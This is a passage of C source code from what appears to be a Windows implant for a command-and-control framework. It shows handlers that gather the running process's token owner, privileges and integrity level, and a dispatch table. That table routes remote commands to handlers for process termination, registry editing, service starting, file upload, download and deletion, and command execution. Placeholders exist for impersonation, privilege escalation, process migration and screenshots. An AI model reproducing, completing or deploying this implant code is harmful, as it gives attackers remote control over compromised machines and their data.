		SockTabList[i] = CreateStructElement(SockTabEntry, _countof(SockTabEntry), 0);
	}

	pFinalElement = CreateRepeatedStructElement(SockTabList, dwNumberOfConnections, 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (pNetState != NULL) {
		FREE(pNetState);
	}

	if (pTemp != NULL) {
		FREE(pTemp);
	}

	if (SockTabList != NULL) {
		FREE(SockTabList);
	}

	FreeElement(pFinalElement);
	return pRespEnvelope;
}

PENVELOPE CurrentTokenOwnerHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	DWORD i = 0;
	PPBElement pFinalElement = NULL;
	HANDLE hToken = NULL;
	PTOKEN_USER pTokenUser = NULL;
	LPSTR lpTokenOwner = NULL;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		LOG_ERROR("OpenProcessToken", GetLastError());
		goto CLEANUP;
	}

	pTokenUser = GetTokenUser(hToken);
	if (pTokenUser == NULL) {
		goto CLEANUP;
	}

	lpTokenOwner = LookupNameOfSid(pTokenUser->User.Sid, TRUE);
	if (lpTokenOwner == NULL) {
		LOG_ERROR("LookupNameOfSid", GetLastError());
		goto CLEANUP;
	}

	pFinalElement = CreateBytesElement(lpTokenOwner, lstrlenA(lpTokenOwner), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (hToken != NULL) {
		CloseHandle(hToken);
	}

	if (pTokenUser != NULL) {
		FREE(pTokenUser);
	}

	if (lpTokenOwner != NULL) {
		FREE(lpTokenOwner);
	}

	FreeElement(pFinalElement);
	return pRespEnvelope;
}

PENVELOPE GetPrivsHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	DWORD i = 0;
	DWORD j = 0;
	PPBElement PrivInfo[6];
	PPBElement RespElement[3];
	PPBElement* PrivelegeList = NULL;
	PPBElement pFinalElement = NULL;
	HANDLE hToken = NULL;
	PTOKEN_USER pTokenUser = NULL;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
	CHAR szProcessPath[MAX_PATH];
	LPSTR lpProcessName = NULL;
	LPSTR lpProcessIntegrity = NULL;
	CHAR szPrivName[0x40];
	CHAR szDisplayName[0x100];
	DWORD dwTemp = 0;
	DWORD dwLanguageId = 0;
	DWORD dwReturnedValue = 0;
	DWORD dwLastError = 0;
	PLUID_AND_ATTRIBUTES pPrivilege;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		LOG_ERROR("OpenProcessToken", GetLastError());
		goto CLEANUP;
	}

	pTokenPrivileges = GetTokenPrivileges(hToken);
	if (pTokenPrivileges == NULL) {
		LOG_ERROR("GetTokenPrivileges", GetLastError());
		goto CLEANUP;
	}

	SetLastError(ERROR_SUCCESS);
	SecureZeroMemory(szProcessPath, sizeof(szProcessPath));
	dwReturnedValue = GetModuleFileNameA(NULL, szProcessPath, _countof(szProcessPath));
	dwLastError = GetLastError();
	if (dwReturnedValue == 0 || dwLastError == ERROR_INSUFFICIENT_BUFFER) {
		LOG_ERROR("GetModuleFileNameA", GetLastError());
		goto CLEANUP;
	}

	lpProcessName = PathFindFileNameA(szProcessPath);
	RespElement[2] = CreateBytesElement(lpProcessName, lstrlenA(lpProcessName), 3);
	lpProcessIntegrity = GetTokenIntegrityLevel(hToken);
	RespElement[1] = CreateBytesElement(lpProcessIntegrity, lstrlenA(lpProcessIntegrity), 2);
	PrivelegeList = ALLOC(sizeof(PPBElement) * pTokenPrivileges->PrivilegeCount);
	for (i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
		for (j = 0; j < _countof(PrivInfo); j++) {
			SecureZeroMemory(szPrivName, sizeof(szPrivName));
			SecureZeroMemory(szDisplayName, sizeof(szDisplayName));
			SecureZeroMemory(PrivInfo, sizeof(PrivInfo));

			pPrivilege = &pTokenPrivileges->Privileges[i];
			dwTemp = _countof(szPrivName);
			LookupPrivilegeNameA(NULL, &pPrivilege->Luid, szPrivName, &dwTemp);
			PrivInfo[0] = CreateBytesElement(szPrivName, lstrlenA(szPrivName), 1);
			dwTemp = _countof(szDisplayName);
			LookupPrivilegeDisplayNameA(NULL, szPrivName, szDisplayName, &dwTemp, &dwLanguageId);
			PrivInfo[1] = CreateBytesElement(szDisplayName, lstrlenA(szDisplayName), 2);
			PrivInfo[2] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_ENABLED) != 0, 3);
			PrivInfo[3] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) != 0, 4);
			PrivInfo[4] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_REMOVED) != 0, 5);
			PrivInfo[5] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_USED_FOR_ACCESS) != 0, 6);
		}

		PrivelegeList[i] = CreateStructElement(PrivInfo, _countof(PrivInfo), 0);
	}

	RespElement[0] = CreateRepeatedStructElement(PrivelegeList, pTokenPrivileges->PrivilegeCount, 1);
	pFinalElement = CreateStructElement(RespElement, _countof(RespElement), 0);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (hToken != NULL) {
		CloseHandle(hToken);
	}

	if (pTokenUser != NULL) {
		FREE(pTokenUser);
	}

	if (PrivelegeList != NULL) {
		FREE(PrivelegeList);
	}

	if (lpProcessIntegrity != NULL) {
		FREE(lpProcessIntegrity);
	}

	if (pTokenPrivileges != NULL) {
		FREE(pTokenPrivileges);
	}

	FreeElement(pFinalElement);
	return pRespEnvelope;
}

SYSTEM_HANDLER* GetSystemHandler()
{
	LPVOID* HandlerList = NULL;

	HandlerList = ALLOC(sizeof(LPVOID) * MsgEnd);
	HandlerList[MsgEnvReq] = GetEnvHandler;
	HandlerList[MsgGetPrivsReq] = GetPrivsHandler;
	HandlerList[MsgCurrentTokenOwnerReq] = CurrentTokenOwnerHandler;
	HandlerList[MsgIfconfigReq] = IfconfigHandler;
	HandlerList[MsgNetstatReq] = NetstatHandler;
	HandlerList[MsgPsReq] = PsHandler;
	HandlerList[MsgTerminateReq] = TerminateHandler;
	HandlerList[MsgRegistryReadReq] = RegistryReadHandler;
	HandlerList[MsgRegistryWriteReq] = RegistryWriteHandler;
	HandlerList[MsgRegistryCreateKeyReq] = RegistryCreateKeyHandler;
	HandlerList[MsgRegistryDeleteKeyReq] = RegistryDeleteKeyHandler;
	HandlerList[MsgRegistrySubKeysListReq] = RegistrySubKeysListHandler;
	HandlerList[MsgRegistryListValuesReq] = RegistryListValuesHandler;
	HandlerList[MsgServicesReq] = ServicesHandler;
	HandlerList[MsgServiceDetailReq] = ServiceDetailHandler;
	HandlerList[MsgStartServiceByNameReq] = StartServiceByNameHandler;
	HandlerList[MsgPing] = PingHandler;
	HandlerList[MsgLsReq] = LsHandler;
	HandlerList[MsgDownloadReq] = DownloadHandler;
	HandlerList[MsgUploadReq] = UploadHandler;
	HandlerList[MsgCdReq] = CdHandler;
	HandlerList[MsgPwdReq] = PwdHandler;
	HandlerList[MsgRmReq] = RmHandler;
	HandlerList[MsgMvReq] = MvHandler;
	HandlerList[MsgCpReq] = CpHandler;
	HandlerList[MsgMkdirReq] = MkdirHandler;
	HandlerList[MsgExecuteReq] = ExecuteHandler;
	
	HandlerList[MsgTaskReq] = NULL;
	HandlerList[MsgProcessDumpReq] = NULL;
	HandlerList[MsgImpersonateReq] = NULL;
	HandlerList[MsgRevToSelfReq] = NULL;
	HandlerList[MsgRunAsReq] = NULL;
	HandlerList[MsgInvokeGetSystemReq] = NULL;
	HandlerList[MsgInvokeExecuteAssemblyReq] = NULL;
	HandlerList[MsgInvokeInProcExecuteAssemblyReq] = NULL;
	HandlerList[MsgInvokeMigrateReq] = NULL;
	HandlerList[MsgSpawnDllReq] = NULL;
	HandlerList[MsgStartServiceReq] = NULL;
	HandlerList[MsgStopServiceReq] = NULL;
	HandlerList[MsgRemoveServiceReq] = NULL;
	HandlerList[MsgSetEnvReq] = NULL;
	HandlerList[MsgUnsetEnvReq] = NULL;
	HandlerList[MsgScreenshotReq] = NULL;
	HandlerList[MsgSideloadReq] = NULL;
	HandlerList[MsgMakeTokenReq] = NULL;
	HandlerList[MsgReconfigureReq] = NULL;
	HandlerList[MsgSSHCommandReq] = NULL;
	HandlerList[MsgChtimesReq] = NULL;
	HandlerList[MsgRegisterExtensionReq] = NULL;
	HandlerList[MsgCallExtensionReq] = NULL;
	HandlerList[MsgListExtensionsReq] = NULL;

	return HandlerList;
}